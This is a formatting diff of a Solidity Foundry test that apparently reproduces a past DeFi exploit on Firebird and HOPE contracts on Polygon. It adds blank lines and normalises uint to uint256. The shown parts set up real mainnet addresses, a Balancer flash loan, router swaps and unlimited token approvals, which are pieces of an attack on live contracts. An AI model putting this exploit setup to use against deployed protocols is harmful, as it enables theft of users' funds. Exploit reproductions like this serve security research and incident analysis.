@@ -16,6 +16,7 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IFireBirdRouter {
+
     function swapExactTokensForTokens(
         address tokenIn,
         address tokenOut,
@@ -26,27 +27,37 @@ interface IFireBirdRouter {
         address to,
         uint256 deadline
     ) external returns (uint256[] memory amounts);
+
 }
 
 interface IFirebirdReserveFund {
+
     function collectFeeFromProtocol() external;
     function sellTokensToUsdc() external;
+
 }
 
 interface IFireBirdPair {
+
     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+
 }
 
 interface IHOPE is IERC20 {
+
     function transferFrom(address holder, address recipient, uint256 amount) external returns (bool);
+
 }
 
 interface IProxyUSDC is IUSDC {
+
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
 }
 
 contract ContractTest is Test {
+
     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IWETH WMATIC = IWETH(payable(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270));
     IFireBirdRouter Router = IFireBirdRouter(0xb31D1B1eA48cE4Bf10ed697d44B747287E785Ad4);
@@ -76,7 +87,7 @@ contract ContractTest is Test {
 
         address[] memory tokens = new address[](1);
         tokens[0] = address(WMATIC);
-        uint256[] memory amounts = new uint[](1);
+        uint256[] memory amounts = new uint256[](1);
         amounts[0] = amount;
         bytes memory userData = "";
         Balancer.flashLoan(address(this), tokens, amounts, userData);
@@ -124,7 +135,7 @@ contract ContractTest is Test {
         uint8[] memory dexIds = new uint8[](1);
         dexIds[0] = dexId;
 
-        uint256[] memory results = new uint[](2);
+        uint256[] memory results = new uint256[](2);
         results = Router.swapExactTokensForTokens(
             tokenIn, tokenOut, amountIn, amountOutMin, paths, dexIds, address(this), type(uint256).max
         );
@@ -142,4 +153,5 @@ contract ContractTest is Test {
         HOPE.approve(address(FLP), type(uint256).max);
         HOPE.approve(address(this), type(uint256).max);
     }
+
 }
